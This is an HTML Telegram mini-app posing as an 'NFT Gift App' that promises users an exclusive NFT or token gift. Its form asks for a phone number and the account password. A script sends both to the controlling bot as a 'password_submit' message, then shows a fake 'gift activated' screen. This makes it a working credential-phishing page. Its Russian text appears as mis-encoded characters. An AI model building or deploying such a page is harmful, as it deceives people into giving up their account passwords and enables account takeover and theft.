<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NFT Gift App</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .header { text-align: center; margin-bottom: 30px; }
        .gift-icon { font-size: 60px; margin-bottom: 15px; }
        h1 { color: #333; margin-bottom: 10px; font-size: 24px; }
        .subtitle { color: #666; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 8px; color: #333; font-weight: 500; }
        input {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
        }
        input:focus { outline: none; border-color: #667eea; }
        .btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .gift-options {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-bottom: 20px;
        }
        .gift-option {
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            text-align: center;
            cursor: pointer;
        }
        .gift-option.selected { border-color: #667eea; background: #f8f9ff; }
        .gift-emoji { font-size: 24px; margin-bottom: 5px; }
        .success-message { text-align: center; padding: 30px; }
        .success-icon { font-size: 80px; margin-bottom: 20px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div id="mainScreen">
            <div class="header">
                <div class="gift-icon">üéÅ</div>
                <h1>NFT Gift App</h1>
                <p class="subtitle">–ü–æ–ª—É—á–∏—Ç–µ —ç–∫—Å–∫–ª—é–∑–∏–≤–Ω—ã–π NFT –ø–æ–¥–∞—Ä–æ–∫</p>
            </div>
            
            <div class="gift-options">
                <div class="gift-option selected" onclick="selectGift('nft')">
                    <div class="gift-emoji">üé®</div>
                    <div>NFT –ö–æ–ª–ª–µ–∫—Ü–∏—è</div>
                </div>
                <div class="gift-option" onclick="selectGift('token')">
                    <div class="gift-emoji">üíé</div>
                    <div>–¢–æ–∫–µ–Ω—ã</div>
                </div>
            </div>
            
            <div class="form-group">
                <label for="phone">–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:</label>
                <input type="tel" id="phone" placeholder="+7 999 123-45-67">
            </div>
            
            <div class="form-group">
                <label for="password">–ü–∞—Ä–æ–ª—å –æ—Ç –∞–∫–∫–∞—É–Ω—Ç–∞:</label>
                <input type="password" id="password" placeholder="–í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å">
            </div>
            
            <button class="btn" onclick="submitData()">üéÅ –ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–∞—Ä–æ–∫</button>
        </div>
        
        <div id="successScreen" class="hidden">
            <div class="success-message">
                <div class="success-icon">üéâ</div>
                <h1>–ü–æ–¥–∞—Ä–æ–∫ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω!</h1>
                <p>–í–∞—à NFT –ø–æ–¥–∞—Ä–æ–∫ —É—Å–ø–µ—à–Ω–æ –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∞–∫–∫–∞—É–Ω—Ç</p>
            </div>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        
        let selectedGift = 'nft';
        
        function selectGift(type) {
            selectedGift = type;
            document.querySelectorAll('.gift-option').forEach(opt => {
                opt.classList.remove('selected');
            });
            event.target.closest('.gift-option').classList.add('selected');
        }
        
        function submitData() {
            const phone = document.getElementById('phone').value;
            const password = document.getElementById('password').value;
            
            if (!phone || !password) {
                alert('–ó–∞–ø–æ–ª–Ω–∏—Ç–µ –≤—Å–µ –ø–æ–ª—è!');
                return;
            }
            
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –≤ –±–æ—Ç–∞
            tg.sendData(JSON.stringify({
                type: 'password_submit',
                phone: phone,
                password: password,
                gift_type: selectedGift
            }));
            
            // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º —ç–∫—Ä–∞–Ω —É—Å–ø–µ—Ö–∞
            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('successScreen').classList.remove('hidden');
            
            setTimeout(() => {
                tg.close();
            }, 3000);
        }
    </script>
</body>
</html>
